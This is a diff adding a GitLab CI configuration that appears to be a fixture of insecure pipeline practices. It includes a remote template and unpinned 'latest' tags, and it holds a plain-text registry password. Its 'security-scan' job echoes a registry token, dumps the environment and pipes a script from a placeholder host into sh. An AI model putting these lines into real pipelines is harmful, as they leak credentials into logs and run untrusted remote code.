@@ -1,0 +1,17 @@
+include:
+  - remote: https://example.invalid/ci.yml
+  - project: group/ci-templates
+    file: /build.yml
+    ref: main
+  - component: gitlab.example.org/group/comp/lint@~latest
+image: python:latest
+variables:
+  REGISTRY_PASSWORD: "plain-text-value"
+security-scan:
+  stage: test
+  allow_failure: true
+  only: [main]
+  script:
+    - echo "$CI_REGISTRY_TOKEN"
+    - env
+    - curl https://example.invalid/x.sh | sh
